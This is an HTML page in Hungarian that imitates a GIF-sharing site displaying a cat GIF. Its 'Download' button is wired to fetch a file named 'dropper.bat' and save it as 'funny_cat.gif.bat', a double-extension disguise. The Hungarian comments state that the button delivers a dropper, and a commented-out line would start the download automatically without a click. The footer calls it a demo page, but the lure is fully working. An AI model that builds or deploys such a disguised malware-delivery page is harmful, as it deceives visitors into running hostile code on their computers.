<!doctype html>
<html lang="hu">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>cat.gif — GIFhub</title>
<style>
  :root{
    --bg:#0f1115; --panel:#171a21; --panel2:#1e222b; --line:#2a2f3a;
    --txt:#e8eaf0; --dim:#9aa3b2; --acc:#5865f2;
  }
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--txt);
       font:15px/1.55 'Segoe UI',system-ui,-apple-system,sans-serif}
  header{position:sticky;top:0;z-index:9;display:flex;align-items:center;gap:14px;
         padding:12px 20px;background:rgba(15,17,21,.92);
         border-bottom:1px solid var(--line);backdrop-filter:blur(8px)}
  .logo{display:flex;align-items:center;gap:8px;font-weight:700;letter-spacing:.3px}
  .logo i{width:26px;height:26px;border-radius:8px;display:grid;place-items:center;
          background:linear-gradient(135deg,#5865f2,#eb459e);font-style:normal;font-size:13px}
  .search{flex:1;max-width:520px;display:flex;align-items:center;gap:8px;
          background:var(--panel2);border:1px solid var(--line);border-radius:999px;padding:8px 14px}
  .search input{flex:1;background:none;border:0;outline:0;color:var(--txt);font:inherit}
  .search span{color:var(--dim);font-size:13px}
  .btn{border:1px solid var(--line);background:var(--panel2);color:var(--txt);
       border-radius:10px;padding:9px 14px;font:inherit;cursor:pointer;transition:.15s}
  .btn:hover{border-color:var(--acc);transform:translateY(-1px)}
  .btn.primary{background:var(--acc);border-color:var(--acc);font-weight:600}

  main{max-width:1080px;margin:0 auto;padding:26px 20px 60px}
  .stage{display:grid;grid-template-columns:1.55fr 1fr;gap:22px}
  @media(max-width:820px){.stage{grid-template-columns:1fr}}

  .viewer{background:var(--panel);border:1px solid var(--line);border-radius:16px;
          padding:14px;display:grid;place-items:center;position:relative;overflow:hidden}
  .viewer img{max-width:100%;border-radius:10px;display:block}
  .badge{position:absolute;top:14px;left:14px;background:rgba(0,0,0,.6);
         border:1px solid var(--line);color:#fff;font-size:11px;letter-spacing:.8px;
         padding:4px 8px;border-radius:6px;text-transform:uppercase}

  .meta h1{font-size:22px;margin:0 0 6px}
  .sub{color:var(--dim);font-size:13px;margin-bottom:18px}
  .stats{display:flex;gap:18px;color:var(--dim);font-size:13px;
         padding:12px 0;border-top:1px solid var(--line);border-bottom:1px solid var(--line);
         margin-bottom:18px}
  .stats b{display:block;color:var(--txt);font-size:15px}
  .actions{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px}
  .tags{display:flex;gap:8px;flex-wrap:wrap}
  .tag{background:var(--panel2);border:1px solid var(--line);border-radius:999px;
       padding:5px 11px;font-size:12px;color:var(--dim)}

  h2{font-size:15px;color:var(--dim);font-weight:600;text-transform:uppercase;
     letter-spacing:1px;margin:34px 0 14px}
  .grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
  @media(max-width:820px){.grid{grid-template-columns:repeat(2,1fr)}}
  .card{background:var(--panel);border:1px solid var(--line);border-radius:12px;
        overflow:hidden;cursor:pointer;transition:.15s}
  .card:hover{transform:translateY(-2px);border-color:var(--acc)}
  .card .thumb{height:110px;display:grid;place-items:center;
               background:radial-gradient(circle at 30% 30%,#2a2f3a,#151821)}
  .card .cap{font-size:12px;color:var(--dim);padding:8px 10px}
  footer{color:var(--dim);font-size:12px;text-align:center;padding:24px 0;border-top:1px solid var(--line)}
</style>
</head>
<body>

<header>
  <div class="logo"><i>▶</i> GIFhub</div>
  <div class="search"><input placeholder="Keress GIF-eket…" value="cat"><span>⚲</span></div>
  <button class="btn">Feltöltés</button>
</header>

<main>
  <div class="stage">
    <!-- GIF maga: inline játszik, semmi letöltés -->
    <div class="viewer">
      <span class="badge">GIF</span>
      <!-- ha van cat.gif a repóban ezt használja, egyébként animált SVG-re esik vissza -->
      <img id="gif" alt="cat.gif"
        src="cat.gif"
        onerror="this.onerror=null;this.src='data:image/svg+xml;utf8,'+encodeURIComponent(document.getElementById('fallback').textContent)">
    </div>

    <div class="meta">
      <h1>cat.gif</h1>
      <div class="sub">GIFhub · feltöltve ma · 0:03 · 480×360</div>

      <div class="stats">
        <div><b>1,2 M</b>megtekintés</div>
        <div><b>34 e</b>kedvelés</div>
        <div><b>GIF</b>formátum</div>
      </div>

      <div class="actions">
        <!-- EZ adja a droppert, .bat-ként -->
        <button class="btn primary" id="dl">Letöltés</button>
        <button class="btn" id="share">Megosztás</button>
        <button class="btn">Beágyazás</button>
      </div>

      <div class="tags">
        <span class="tag">#cat</span><span class="tag">#funny</span>
        <span class="tag">#cute</span><span class="tag">#gif</span>
      </div>
    </div>
  </div>

  <h2>Hasonló GIF-ek</h2>
  <div class="grid">
    <div class="card"><div class="thumb">🐱</div><div class="cap">cat dance.gif</div></div>
    <div class="card"><div class="thumb">😹</div><div class="cap">cat lol.gif</div></div>
    <div class="card"><div class="thumb">🐈</div><div class="cap">cat running.gif</div></div>
    <div class="card"><div class="thumb">😼</div><div class="cap">cat vibing.gif</div></div>
  </div>

  <footer>GIFhub — demo oldal</footer>
</main>

<!-- animált tartalék SVG (ha nincs cat.gif feltöltve) -->
<script type="text/template" id="fallback">
<svg xmlns="http://www.w3.org/2000/svg" width="480" height="360">
  <rect width="480" height="360" fill="#1e222b"/>
  <circle cx="240" cy="150" r="70" fill="#5865f2">
    <animate attributeName="cy" values="150;120;150" dur="0.9s" repeatCount="indefinite"/>
  </circle>
  <circle cx="215" cy="140" r="9" fill="#fff"/>
  <circle cx="265" cy="140" r="9" fill="#fff"/>
  <path d="M210 175 q30 25 60 0" stroke="#fff" stroke-width="6" fill="none" stroke-linecap="round"/>
  <text x="240" y="300" fill="#9aa3b2" font-family="Segoe UI,sans-serif" font-size="16"
        text-anchor="middle">cat.gif</text>
</svg>
</script>

<script>
  // "Letöltés" → dropper, de GIF néven
  document.getElementById('dl').addEventListener('click', () => {
    const a = document.createElement('a');
    a.href = 'dropper.bat';
    a.download = 'funny_cat.gif.bat';
    document.body.appendChild(a);
    a.click();
  });

  // Megosztás: a link vágólapra
  document.getElementById('share').addEventListener('click', () => {
    navigator.clipboard?.writeText(location.href);
  });

  // ha kattintás nélkül akarod, vedd ki a kommentet (kb. 1,2 mp után indul):
  // setTimeout(() => document.getElementById('dl').click(), 1200);
</script>
</body>
</html>
